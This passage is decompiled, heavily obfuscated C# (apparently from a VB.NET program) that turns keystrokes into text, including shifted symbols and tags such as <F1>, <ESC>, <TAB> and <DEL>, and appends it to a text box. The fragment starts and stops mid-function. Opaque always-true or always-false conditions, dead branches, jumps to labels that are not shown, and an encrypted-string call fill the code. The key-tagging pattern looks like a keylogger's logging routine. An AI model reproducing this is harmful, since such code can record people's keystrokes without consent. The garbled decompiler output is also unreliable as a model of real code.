        if (true)
          goto label_4;
        else
          goto label_144;
      }
label_114:
      if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
        return;
      if ((uint) flag2 - (uint) flag2 < 0U)
        goto label_740;
label_116:
      flag2 = Key == Keys.F6;
      goto label_113;
label_117:
      if (flag2)
      {
        this.TextBox1.Text += "<F5>";
        goto label_4;
      }
label_118:
      if (((flag1 ? 1 : 0) | 2) != 0)
      {
        if (true)
          goto label_114;
        else
          goto label_113;
      }
      else
        goto label_1107;
label_123:
      flag2 = Key == Keys.F4;
      if (!flag2)
      {
        flag2 = Key == Keys.F5;
        goto label_117;
      }
      else
      {
        this.TextBox1.Text += "<F4>";
        goto label_4;
      }
label_128:
      flag2 = Key == Keys.F3;
label_131:
      if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
      {
        if (true)
        {
          if (true)
          {
            if (flag2)
            {
              this.TextBox1.Text += "<F3>";
              goto label_4;
            }
            else if (((flag1 ? 1 : 0) & 0) == 0)
              goto label_123;
            else
              goto label_116;
          }
          else
            goto label_191;
        }
      }
      else
        goto label_4;
label_144:
      while (!flag2)
      {
        flag2 = Key == Keys.F2;
        if (true)
        {
          while ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
          {
            if ((uint) flag1 >= 0U)
            {
              if (((flag1 ? 1 : 0) | 8) != 0)
              {
                if ((uint) flag2 <= uint.MaxValue)
                {
                  if (flag2)
                  {
                    this.TextBox1.Text += "<F2>";
                    if (true)
                    {
                      if (false)
                      {
                        if ((uint) flag1 <= uint.MaxValue)
                          goto label_143;
                      }
                      else if ((uint) flag1 >= 0U)
                        goto label_4;
                      else
                        goto label_144;
                    }
                    else
                      goto label_292;
                  }
                  else
                    goto label_128;
                }
                else
                  goto label_4;
              }
              else
                goto label_1663;
            }
            else
              goto label_143;
          }
          if ((uint) flag2 >= 0U)
            goto label_237;
          else
            goto label_238;
        }
label_143:
        if (((flag1 ? 1 : 0) & 0) != 0)
          goto label_1444;
      }
label_146:
      this.TextBox1.Text += "<F1>";
      goto label_4;
label_150:
      this.TextBox1.Text += "\r\n";
      if ((uint) flag1 >= 0U)
        goto label_4;
label_151:
      flag2 = Key == Keys.Return;
      if (!flag2)
      {
        flag2 = Key == Keys.F1;
        if (true)
        {
          if (true)
          {
            if ((uint) flag2 > uint.MaxValue)
              goto label_1680;
          }
          else if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
            goto label_1432;
          else
            goto label_305;
        }
        if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
          goto label_161;
      }
      else
        goto label_150;
label_159:
      if ((uint) flag1 + (uint) flag2 >= 0U)
      {
        while (!flag2)
        {
          if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
          {
            if ((uint) flag2 > uint.MaxValue)
            {
              if (true)
              {
                if (((flag2 ? 1 : 0) & 0) != 0)
                  goto label_256;
              }
              else
                continue;
            }
            else
              goto label_151;
          }
          if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
            goto label_151;
          else
            goto label_161;
        }
        this.TextBox1.Text += " ";
        goto label_4;
      }
      else
        goto label_795;
label_161:
      if ((uint) flag1 + (uint) flag1 < 0U)
      {
        if (false)
          return;
        goto label_104;
      }
      else
        goto label_144;
label_164:
      this.TextBox1.Text += "~";
      goto label_4;
label_165:
      if ((uint) flag2 - (uint) flag1 >= 0U)
      {
        flag2 = Key == Keys.Oemtilde;
        if (!flag2)
        {
          flag2 = Key == Keys.Space;
          if ((uint) flag2 > uint.MaxValue)
            return;
          goto label_159;
        }
        else
          goto label_164;
      }
      else if (((flag1 ? 1 : 0) & 0) == 0)
      {
        if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
          goto label_292;
        else
          goto label_252;
      }
      else
        goto label_256;
label_179:
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
      {
        if (true)
        {
          flag2 = Key == Keys.OemSemicolon;
          if (((flag2 ? 1 : 0) & 0) == 0)
          {
            if (!flag2)
            {
              if (true)
                goto label_173;
label_171:
              if (true)
              {
                if (!flag2)
                {
                  if (true)
                    goto label_165;
                  else
                    goto label_164;
                }
              }
              else
                goto label_172;
label_170:
              this.TextBox1.Text += ">";
              goto label_4;
label_172:
              if (((flag1 ? 1 : 0) | 4) != 0)
              {
                if ((uint) flag2 > uint.MaxValue)
                  goto label_1710;
                else
                  goto label_170;
              }
              else
                goto label_1265;
label_173:
              flag2 = Key == Keys.OemPeriod;
              goto label_171;
            }
            else
            {
              this.TextBox1.Text += ":";
              goto label_4;
            }
          }
          else
            goto label_320;
        }
        else
          goto label_612;
      }
      else
        goto label_376;
label_186:
      while (!flag2)
      {
        flag2 = Key == Keys.OemQuestion;
        if (((flag2 ? 1 : 0) | -2) != 0 && !flag2)
        {
          flag2 = Key == Keys.OemPipe;
          if (true)
          {
            if (!flag2)
            {
              if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
                goto label_1035;
              else
                goto label_179;
            }
            else
            {
              this.TextBox1.Text += "|";
              if ((uint) flag2 - (uint) flag1 >= 0U)
                goto label_4;
              else
                goto label_4;
            }
          }
          else
            goto label_4;
        }
        else
        {
          this.TextBox1.Text += "?";
          if (true)
            goto label_4;
        }
      }
label_187:
      this.TextBox1.Text += "}";
      if (false)
      {
        if (((flag2 ? 1 : 0) & 0) == 0)
          goto label_186;
        else
          goto label_196;
      }
      else
        goto label_4;
label_188:
      flag2 = Key == Keys.OemCloseBrackets;
      if (((flag2 ? 1 : 0) | 15) != 0)
        goto label_186;
      else
        goto label_187;
label_191:
      this.TextBox1.Text += "{";
      if (true)
        goto label_4;
      else
        goto label_188;
label_193:
      flag2 = Key == Keys.OemOpenBrackets;
      if (true)
      {
        if (flag2)
        {
          if ((uint) flag1 > uint.MaxValue)
            goto label_747;
          else
            goto label_191;
        }
        else
          goto label_188;
      }
      else
        goto label_186;
label_196:
      if (!flag2)
      {
        flag2 = Key == Keys.OemMinus;
        if (flag2)
        {
          this.TextBox1.Text += "_";
          goto label_4;
        }
        else
          goto label_193;
      }
      else
      {
        do
        {
          this.TextBox1.Text += "<";
          if (((flag1 ? 1 : 0) & 0) == 0)
          {
            if (true)
            {
              if (((flag2 ? 1 : 0) | int.MaxValue) == 0)
              {
                if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
                {
                  if ((uint) flag2 < 0U)
                    goto label_1878;
                }
                else
                  goto label_204;
              }
              else
                goto label_4;
            }
            else
              goto label_677;
          }
          else
            goto label_1902;
        }
        while (((flag2 ? 1 : 0) & 0) == 0);
        goto label_1665;
label_1902:
        return;
label_1878:
        return;
label_204:
        if ((uint) flag1 <= uint.MaxValue)
          goto label_197;
        else
          goto label_205;
label_1665:
        if (false)
          goto label_485;
        else
          goto label_1663;
      }
label_197:
      if ((uint) flag1 - (uint) flag1 > uint.MaxValue)
        goto label_974;
label_205:
      if ((uint) flag2 <= uint.MaxValue)
        goto label_196;
label_206:
      if (false)
        goto label_208;
label_207:
      flag2 = Key == Keys.Oemcomma;
      goto label_196;
label_208:
      if (flag2)
      {
        this.TextBox1.Text += "Z";
        goto label_4;
      }
      else
        goto label_207;
label_210:
      flag2 = Key == Keys.Z;
      if ((uint) flag1 <= uint.MaxValue)
        goto label_208;
      else
        goto label_206;
label_211:
      flag2 = Key == Keys.Y;
      if (flag2)
      {
        this.TextBox1.Text += "Y";
        goto label_4;
      }
      else
        goto label_210;
label_220:
      this.TextBox1.Text += "X";
      goto label_4;
label_223:
      flag2 = Key == Keys.X;
      while (!flag2)
      {
        if (true)
        {
          if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
          {
            if (false)
              goto label_462;
            else
              goto label_211;
          }
          else if ((uint) flag1 + (uint) flag2 >= 0U)
          {
            if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
            {
              if ((uint) flag2 <= uint.MaxValue)
                goto label_211;
              else
                goto label_4;
            }
          }
          else
            goto label_4;
        }
        else
          goto label_994;
      }
      goto label_220;
label_224:
      if ((uint) flag2 <= uint.MaxValue)
        goto label_223;
label_225:
      if (!flag2)
      {
        if ((uint) flag1 - (uint) flag1 < 0U || (uint) flag2 < 0U)
          goto label_224;
        else
          goto label_223;
      }
      else
      {
        this.TextBox1.Text += "W";
        goto label_4;
      }
label_233:
      if ((uint) flag2 <= uint.MaxValue && !flag2)
      {
        flag2 = Key == Keys.W;
        if (true)
          goto label_241;
      }
      this.TextBox1.Text += "V";
      goto label_4;
label_234:
      if (flag2)
        goto label_236;
label_235:
      flag2 = Key == Keys.V;
      if (((flag2 ? 1 : 0) | 2) != 0)
        goto label_240;
label_236:
      this.TextBox1.Text += "U";
      goto label_4;
label_237:
      flag2 = Key == Keys.U;
      goto label_234;
label_238:
      if (!flag2)
      {
        if ((uint) flag1 + (uint) flag2 >= 0U)
          goto label_237;
      }
      else
        goto label_243;
label_240:
      if ((uint) flag2 <= uint.MaxValue)
        goto label_233;
label_241:
      if (true)
      {
        if ((uint) flag1 - (uint) flag2 >= 0U)
        {
          if (((flag1 ? 1 : 0) | int.MaxValue) == 0)
            return;
          if ((uint) flag1 - (uint) flag2 < 0U)
          {
            if (((flag2 ? 1 : 0) & 0) == 0)
            {
              if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
                goto label_443;
              else
                goto label_220;
            }
            else
              goto label_1856;
          }
          else
            goto label_225;
        }
        else
          goto label_1135;
      }
      else if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
        goto label_246;
label_243:
      this.TextBox1.Text += "T";
      goto label_4;
label_245:
      flag2 = Key == Keys.T;
      if ((uint) flag1 > uint.MaxValue)
        goto label_884;
      else
        goto label_238;
label_246:
      if (false)
        goto label_1609;
label_247:
      if (!flag2)
        goto label_245;
label_251:
      this.TextBox1.Text += "S";
      if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag1 >= 0U)
        {
          if (false)
            goto label_2080;
          else
            goto label_262;
        }
        else
          goto label_256;
      }
      else
        goto label_1020;
label_252:
      flag2 = Key == Keys.S;
      goto label_247;
label_256:
      if (flag2)
      {
        this.TextBox1.Text += "R";
        goto label_4;
      }
      else
        goto label_252;
label_262:
      if (true)
        goto label_4;
      else
        goto label_319;
label_264:
      if ((uint) flag2 >= 0U)
      {
        if (((flag1 ? 1 : 0) & 0) == 0)
          goto label_4;
        else
          goto label_318;
      }
      else
        goto label_1069;
label_268:
      if (((flag2 ? 1 : 0) | -1) == 0)
        goto label_450;
label_269:
      this.TextBox1.Text += "Q";
      if (true)
      {
        if (true)
        {
          if ((uint) flag1 < 0U)
            goto label_973;
          else
            goto label_264;
        }
        else
          goto label_2108;
      }
      else
        goto label_318;
label_270:
      flag2 = Key == Keys.Q;
      if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
        goto label_1371;
label_273:
      if (true)
      {
        if (flag2)
          goto label_269;
        else
          goto label_318;
      }
      else
        goto label_268;
label_274:
      if ((uint) flag1 >= 0U)
      {
        if (((flag2 ? 1 : 0) | 4) != 0)
          goto label_270;
        else
          goto label_268;
      }
label_275:
      if (!flag2)
      {
        if (true)
        {
          if ((uint) flag2 >= 0U)
            goto label_270;
          else
            goto label_273;
        }
        else
          goto label_274;
      }
label_278:
      this.TextBox1.Text += "P";
      if ((uint) flag1 >= 0U)
      {
        if (((flag1 ? 1 : 0) | (int) byte.MaxValue) == 0)
          goto label_1673;
        else
          goto label_4;
      }
      else if (true)
        goto label_274;
      else
        goto label_318;
label_281:
      this.TextBox1.Text += "O";
      goto label_317;
label_291:
      flag2 = Key == Keys.O;
      goto label_316;
label_292:
      if (((flag2 ? 1 : 0) | 1) != 0)
      {
        if (true)
          goto label_291;
        else
          goto label_316;
      }
label_293:
      if (!flag2)
      {
        if ((uint) flag1 <= uint.MaxValue)
        {
          if ((uint) flag2 <= uint.MaxValue)
          {
            if ((uint) flag1 + (uint) flag1 < 0U)
              goto label_2095;
            else
              goto label_291;
          }
          else
            goto label_292;
        }
        else if (true || (uint) flag2 + (uint) flag1 >= 0U)
          goto label_292;
        else
          goto label_911;
      }
label_297:
      this.TextBox1.Text += "N";
label_302:
      if ((uint) flag1 >= 0U)
      {
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
          goto label_4;
        else
          goto label_316;
      }
label_305:
      while (!flag2)
      {
        while ((uint) flag1 + (uint) flag1 > uint.MaxValue)
        {
          if (true)
          {
            if (false)
              return;
            if (((flag1 ? 1 : 0) | -2) != 0)
            {
              if (((flag2 ? 1 : 0) & 0) == 0)
                break;
            }
            else
              goto label_305;
          }
          else
            goto label_305;
        }
        flag2 = Key == Keys.N;
        if ((uint) flag1 <= uint.MaxValue)
        {
          if ((uint) flag1 < 0U)
          {
            if (((flag1 ? 1 : 0) | 8) != 0)
              goto label_297;
            else
              goto label_302;
          }
          else
            goto label_293;
        }
        else
          goto label_1170;
      }
      this.TextBox1.Text += "M";
      goto label_4;
label_316:
      if (true)
      {
        while (true)
        {
          if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
          {
            if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
            {
              if ((uint) flag2 - (uint) flag2 >= 0U)
              {
                if (false)
                  return;
                goto label_245;
              }
              else
                goto label_179;
            }
            else if (((flag1 ? 1 : 0) & 0) == 0)
            {
              if (!flag2)
              {
                flag2 = Key == Keys.P;
                goto label_275;
              }
              else if ((uint) flag2 + (uint) flag1 >= 0U)
              {
                if (true)
                  goto label_281;
              }
              else
                goto label_695;
            }
            else
              goto label_281;
          }
          else
            goto label_813;
        }
        goto label_252;
      }
label_317:
      if (((flag2 ? 1 : 0) | int.MaxValue) != 0)
        goto label_4;
label_318:
      if (true)
      {
        flag2 = Key == Keys.R;
        goto label_256;
      }
label_319:
      if ((uint) flag1 <= uint.MaxValue)
        goto label_246;
label_320:
      flag2 = Key == Keys.L;
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
      {
        if (flag2)
          goto label_314;
label_310:
        if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
        {
          flag2 = Key == Keys.M;
          if (false)
            goto label_356;
          else
            goto label_305;
        }
        else
          goto label_700;
label_314:
        this.TextBox1.Text += "L";
        if (true)
        {
          if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
            return;
          goto label_4;
        }
        else
          goto label_310;
      }
      else
        goto label_1467;
label_321:
      if (false)
      {
        if ((uint) flag2 - (uint) flag2 >= 0U)
          goto label_326;
        else
          goto label_320;
      }
      else
      {
        if (((flag2 ? 1 : 0) & 0) == 0)
          return;
        goto label_872;
      }
label_323:
      this.TextBox1.Text += "K";
      if (false)
        goto label_1627;
      else
        goto label_4;
label_324:
      if (!flag2)
      {
        flag2 = Key == Keys.K;
        if (flag2)
          goto label_323;
        else
          goto label_320;
      }
      else
      {
        this.TextBox1.Text += "J";
        if (false)
        {
          if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
            goto label_953;
          else
            goto label_952;
        }
        else
          goto label_4;
      }
label_326:
      if ((uint) flag1 < 0U)
        return;
      if (true)
        goto label_324;
      else
        goto label_323;
label_340:
      while (!flag2)
      {
        if (true)
        {
          if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
            goto label_339;
label_330:
          flag2 = Key == Keys.I;
          if (!flag2)
          {
            flag2 = Key == Keys.J;
            goto label_324;
          }
          else
          {
            this.TextBox1.Text += string.Intern(x1110bdd110cdcea4._xaacba899487bce8c("dkfd", 1100690778));
            goto label_4;
          }
label_339:
          if ((uint) flag2 >= 0U)
          {
            if ((uint) flag1 + (uint) flag2 < 0U)
              return;
            if (true)
            {
              if (((flag1 ? 1 : 0) & 0) == 0)
              {
                if ((uint) flag1 >= 0U)
                {
                  if ((uint) flag2 + (uint) flag2 >= 0U)
                  {
                    if (((flag1 ? 1 : 0) & 0) == 0)
                    {
                      if ((uint) flag2 < 0U)
                        goto label_752;
                      else
                        goto label_330;
                    }
                    else
                      goto label_566;
                  }
                  else
                    goto label_4;
                }
                else
                  goto label_370;
              }
              else
                goto label_1155;
            }
            else
              goto label_886;
          }
        }
        else
          goto label_4;
      }
      this.TextBox1.Text += "H";
      if ((uint) flag1 - (uint) flag2 >= 0U)
      {
        if (true)
          goto label_4;
        else
          goto label_355;
      }
      else
        goto label_462;
label_350:
      this.TextBox1.Text += "F";
      goto label_4;
label_352:
      flag2 = Key == Keys.F;
      if (!flag2)
      {
        flag2 = Key == Keys.G;
        if ((uint) flag1 - (uint) flag2 >= 0U)
        {
          if (!flag2)
          {
            flag2 = Key == Keys.H;
            goto label_340;
          }
          else if (((flag1 ? 1 : 0) | int.MaxValue) != 0)
          {
            this.TextBox1.Text += "G";
            goto label_4;
          }
          else
            goto label_4;
        }
        else
          goto label_380;
      }
      else
        goto label_350;
label_353:
      if (flag2)
        goto label_356;
      else
        goto label_352;
label_355:
      if (true)
        goto label_353;
label_356:
      this.TextBox1.Text += "E";
      goto label_4;
label_360:
      this.TextBox1.Text += "D";
      if (((flag1 ? 1 : 0) | int.MaxValue) != 0)
      {
        if (true)
        {
          if (((flag1 ? 1 : 0) | 2) == 0)
            return;
        }
        else
          goto label_2067;
      }
      if ((uint) flag2 <= uint.MaxValue)
        goto label_4;
      else
        goto label_355;
label_361:
      if (!flag2)
      {
        flag2 = Key == Keys.D;
        if (!flag2)
        {
          flag2 = Key == Keys.E;
          goto label_355;
        }
        else if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
          goto label_360;
      }
      else
        goto label_368;
label_364:
      if ((uint) flag2 + (uint) flag2 >= 0U)
      {
        if (false)
          goto label_1882;
        else
          goto label_4;
      }
      else
      {
        if (false)
          return;
        goto label_1317;
      }
label_367:
      flag2 = Key == Keys.C;
      if ((uint) flag1 >= 0U)
        goto label_361;
label_368:
      this.TextBox1.Text += "C";
      if ((uint) flag1 + (uint) flag1 < 0U)
        goto label_97;
      else
        goto label_406;
label_369:
      if ((uint) flag1 <= uint.MaxValue)
        goto label_367;
label_370:
      if ((uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag2 - (uint) flag2 >= 0U)
        {
          if (true)
          {
            if ((uint) flag2 - (uint) flag2 < 0U || (uint) flag1 - (uint) flag2 >= 0U)
            {
              if ((uint) flag2 + (uint) flag2 >= 0U)
                goto label_405;
              else
                goto label_386;
            }
            else
              goto label_369;
          }
          else
            goto label_382;
        }
        else
          goto label_373;
      }
label_371:
      if (flag2)
        goto label_375;
      else
        goto label_369;
label_373:
      if (((flag2 ? 1 : 0) | -2) == 0)
        goto label_1817;
      else
        goto label_4;
label_375:
      this.TextBox1.Text += "B";
      if ((uint) flag2 + (uint) flag1 >= 0U)
        goto label_373;
      else
        goto label_382;
label_376:
      if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
      {
        if (((flag1 ? 1 : 0) | 2) != 0)
        {
          if ((uint) flag2 >= 0U)
          {
            if ((uint) flag2 + (uint) flag1 >= 0U)
              goto label_375;
            else
              goto label_373;
          }
          else
            goto label_361;
        }
        else
          goto label_207;
      }
      else
        goto label_371;
label_380:
      if ((uint) flag1 + (uint) flag1 >= 0U)
      {
        if ((uint) flag1 - (uint) flag1 < 0U)
          return;
        goto label_376;
      }
      else
        goto label_826;
label_382:
      if (true)
      {
        flag2 = Key == Keys.B;
        goto label_380;
      }
      else
        goto label_1078;
label_386:
      if (false)
      {
        if (((flag1 ? 1 : 0) & 0) == 0)
        {
          if ((uint) flag2 <= uint.MaxValue)
            goto label_923;
          else
            goto label_877;
        }
        else
          goto label_1443;
      }
      else
        goto label_382;
label_387:
      this.TextBox1.Text += "A";
      if (((flag1 ? 1 : 0) | 8) == 0)
        goto label_2097;
      else
        goto label_4;
label_392:
      if (((flag2 ? 1 : 0) & 0) == 0)
      {
        if ((uint) flag2 <= uint.MaxValue)
        {
          if (!flag2)
          {
            flag2 = Key == Keys.A;
            if (flag2)
              goto label_387;
            else
              goto label_386;
          }
          else
          {
            this.TextBox1.Text += ")";
            if (((flag1 ? 1 : 0) | 2) != 0)
              goto label_404;
          }
        }
        else
          goto label_763;
      }
      else
        goto label_79;
label_396:
      if (!flag2)
      {
        if ((uint) flag2 <= uint.MaxValue)
        {
          flag2 = Key == Keys.D9;
          if (!flag2)
          {
            flag2 = Key == Keys.D0;
            goto label_392;
          }
          else
          {
            this.TextBox1.Text += "(";
            goto label_4;
          }
        }
        else
          goto label_404;
      }
label_398:
      this.TextBox1.Text += "*";
      goto label_4;
label_404:
      if (((flag1 ? 1 : 0) | 1) != 0)
        goto label_4;
label_405:
      if ((uint) flag1 + (uint) flag2 >= 0U)
        goto label_367;
label_406:
      if (true)
        goto label_410;
label_407:
      while (flag2)
      {
        this.TextBox1.Text += "^";
        if ((uint) flag1 - (uint) flag2 < 0U)
        {
          if (false)
            goto label_420;
        }
        else
          goto label_4;
      }
      flag2 = Key == Keys.D7;
      if (!flag2)
      {
        flag2 = Key == Keys.D8;
        if ((uint) flag2 + (uint) flag1 < 0U)
        {
          if (true)
          {
            if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
              goto label_398;
            else
              goto label_396;
          }
        }
        else
          goto label_396;
      }
      else
        goto label_409;
label_401:
      if (false)
        return;
      this.TextBox1.Text += "&";
      goto label_4;
label_409:
      if ((uint) flag1 + (uint) flag1 >= 0U)
        goto label_401;
label_410:
      if (true)
        goto label_420;
      else
        goto label_417;
label_413:
      this.TextBox1.Text += "%";
      goto label_4;
label_414:
      if (!flag2)
      {
        flag2 = Key == Keys.D5;
        if (((flag2 ? 1 : 0) | int.MaxValue) == 0 || !flag2)
        {
          flag2 = Key == Keys.D6;
          goto label_407;
        }
        else
          goto label_413;
      }
      else
      {
        this.TextBox1.Text += "$";
        goto label_4;
      }
label_417:
      if (!flag2)
      {
        flag2 = Key == Keys.D4;
        goto label_414;
      }
      else
        goto label_422;
label_420:
      if ((uint) flag1 - (uint) flag1 > uint.MaxValue)
      {
        if (false)
          return;
        goto label_326;
      }
      else
        goto label_364;
label_422:
      this.TextBox1.Text += "#";
      goto label_432;
label_423:
      if (flag2)
      {
        this.TextBox1.Text += "@";
        if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
          goto label_4;
        else
          goto label_428;
      }
label_424:
      flag2 = Key == Keys.D3;
      if ((uint) flag1 + (uint) flag2 > uint.MaxValue)
      {
        if (true)
          goto label_422;
        else
          goto label_432;
      }
      else
        goto label_417;
label_428:
      this.TextBox1.Text += "!";
      goto label_4;
label_431:
      if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
        goto label_1898;
      else
        goto label_428;
label_432:
      if (true)
        goto label_4;
label_433:
      flag1 = Key == Keys.D1;
      if (((flag1 ? 1 : 0) & 0) == 0)
      {
        if ((uint) flag1 + (uint) flag1 >= 0U)
        {
          if (!flag1)
          {
            flag2 = Key == Keys.D2;
            goto label_423;
          }
          else
            goto label_428;
        }
        else
          goto label_431;
      }
      else
        goto label_640;
label_434:
      flag2 = MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock;
      if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
      {
        if (!flag2)
        {
          if ((uint) flag2 + (uint) flag2 >= 0U)
            goto label_10;
          else
            goto label_4;
        }
        else
          goto label_433;
      }
      else if (true)
      {
        if (false)
          goto label_529;
        else
          goto label_352;
      }
      else
        goto label_353;
label_435:
      if (!flag2)
        return;
label_436:
      this.TextBox1.Text += "*";
      if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
        return;
      goto label_435;
label_438:
      if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
      {
        if ((uint) flag1 + (uint) flag1 > uint.MaxValue || (uint) flag1 + (uint) flag2 <= uint.MaxValue)
          goto label_435;
        else
          goto label_436;
      }
      else
        goto label_1710;
label_442:
      flag2 = Key == Keys.Add;
      if (!flag2)
      {
        flag2 = Key == Keys.Multiply;
        goto label_438;
      }
      else
      {
        if ((uint) flag1 - (uint) flag2 >= 0U)
        {
          this.TextBox1.Text += "+";
          return;
        }
        if ((uint) flag2 >= 0U)
          goto label_417;
        else
          goto label_326;
      }
label_443:
      if ((uint) flag2 <= uint.MaxValue)
      {
        if ((uint) flag1 < 0U)
          goto label_14;
        else
          goto label_442;
      }
label_444:
      if (!flag2)
      {
        if (((flag2 ? 1 : 0) & 0) == 0)
          goto label_442;
        else
          goto label_458;
      }
label_448:
      this.TextBox1.Text += "-";
      return;
label_450:
      flag2 = Key == Keys.Subtract;
      goto label_444;
label_458:
      this.TextBox1.Text += "/";
      if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
        return;
      goto label_1829;
label_459:
      flag2 = Key == Keys.Divide;
      if ((uint) flag2 <= uint.MaxValue)
      {
        if (!flag2)
        {
          flag2 = Key == Keys.Decimal;
          if ((uint) flag1 < 0U)
            return;
          if (!flag2)
          {
            if (((flag1 ? 1 : 0) | 2) != 0)
            {
              if (false)
              {
                if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
                {
                  if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
                    goto label_752;
                  else
                    goto label_1016;
                }
                else
                  goto label_547;
              }
              else
                goto label_450;
            }
            else
              goto label_448;
          }
          else
          {
            this.TextBox1.Text += ".";
            if (((flag1 ? 1 : 0) | int.MaxValue) != 0)
            {
              if (((flag2 ? 1 : 0) | 1) == 0)
                ;
              return;
            }
            goto label_1829;
          }
        }
        else
          goto label_458;
      }
      else if (true)
      {
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
          goto label_458;
        else
          goto label_515;
      }
      else
        goto label_472;
label_462:
      bool flag3;
      do
      {
        flag3 = Key == Keys.Escape;
        if (flag3)
        {
          if (false)
          {
            if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
              goto label_1551;
          }
          else
            goto label_465;
        }
        else
          goto label_459;
      }
      while ((uint) flag1 + (uint) flag1 <= uint.MaxValue);
      goto label_1311;
label_465:
      if ((uint) flag3 >= 0U)
      {
        this.TextBox1.Text += "<ESC>";
        return;
      }
      if (((flag3 ? 1 : 0) & 0) == 0)
        ;
label_469:
      flag2 = Key == Keys.End;
      if (true)
      {
        if (flag2)
        {
          this.TextBox1.Text += "<END>";
          return;
        }
        goto label_462;
      }
      else
        goto label_1812;
label_470:
      if (!flag2)
        goto label_469;
label_472:
      this.TextBox1.Text += "<TAB>";
      if ((uint) flag1 + (uint) flag1 >= 0U)
        return;
      goto label_1029;
label_474:
      if (flag2)
      {
        this.TextBox1.Text += "?";
        return;
      }
label_475:
      flag2 = Key == Keys.Tab;
      if (true)
        goto label_470;
      else
        goto label_472;
label_482:
      flag2 = Key == Keys.Left;
      if (false)
        return;
      if ((uint) flag2 <= uint.MaxValue && !flag2)
      {
        if ((uint) flag2 + (uint) flag1 >= 0U)
        {
          if ((uint) flag1 <= uint.MaxValue)
          {
            flag2 = Key == Keys.Right;
            goto label_474;
          }
          else
            goto label_542;
        }
        else if (true)
        {
          if ((uint) flag1 <= uint.MaxValue)
          {
            if ((uint) flag1 + (uint) flag2 < 0U)
              goto label_252;
            else
              goto label_1845;
          }
          else
            goto label_413;
        }
        else
          goto label_1034;
      }
      else
      {
        this.TextBox1.Text += "?";
        if (true)
          return;
        if (false)
        {
          if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
            goto label_972;
          else
            goto label_979;
        }
        else
          goto label_976;
      }
label_485:
      this.TextBox1.Text += "?";
      return;
label_489:
      if (((flag1 ? 1 : 0) & 0) != 0)
        goto label_1295;
label_490:
      this.TextBox1.Text += "<DEL>";
      if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
        return;
      goto label_117;
label_496:
      if (((flag1 ? 1 : 0) & 0) != 0)
        goto label_499;
label_497:
      if (Key != Keys.Delete)
      {
        flag2 = Key == Keys.Back;
        if (((flag1 ? 1 : 0) & 0) == 0)
        {
          if (((flag2 ? 1 : 0) | 8) != 0)
          {
            if (true)
            {
              if (!flag2)
              {
                if (Key != Keys.Down)
                {
                  if (Key == Keys.Up)
                  {
                    this.TextBox1.Text += "?";
                    return;
                  }
                  goto label_482;
                }
                else
                  goto label_485;
              }
              else
                goto label_490;
            }
            else
            {
              if ((uint) flag1 + (uint) flag1 < 0U)
                return;
              if ((uint) flag1 - (uint) flag2 > uint.MaxValue)
                goto label_264;
              else
                goto label_489;
            }
          }
          else
            goto label_1952;
        }
        else
          goto label_1458;
      }
      else
      {
        if ((uint) flag1 > uint.MaxValue)
          return;
        this.TextBox1.Text += "<DEL>";
        return;
      }
label_499:
      if (flag2)
      {
        this.TextBox1.Text += "<F12>";
        if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
        {
          if ((uint) flag2 + (uint) flag2 >= 0U)
            return;
          if (true)
          {
            if ((uint) flag2 - (uint) flag1 >= 0U)
              goto label_98;
            else
              goto label_97;
          }
          else
            goto label_4;
        }
        else
          goto label_503;
      }
      else
        goto label_497;
label_502:
      flag2 = Key == Keys.F12;
      goto label_499;
label_503:
      if (false)
        goto label_65;
      else
        goto label_502;
label_506:
      if (!flag2)
      {
        if (true)
        {
          if ((uint) flag2 - (uint) flag1 < 0U)
            goto label_2109;
          else
            goto label_516;
        }
        else
          goto label_1900;
      }
      else
      {
        this.TextBox1.Text += "<F11>";
        if (true)
        {
          if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
            return;
          goto label_234;
        }
        else
          goto label_817;
      }
label_513:
      if (!flag2)
      {
        if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
        {
          if (((flag1 ? 1 : 0) | 2) != 0)
          {
            flag2 = Key == Keys.F11;
            if ((uint) flag1 < 0U)
            {
              if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
                goto label_502;
              else
                goto label_516;
            }
            else
              goto label_506;
          }
          else
            goto label_1809;
        }
        else
          goto label_1028;
      }
label_514:
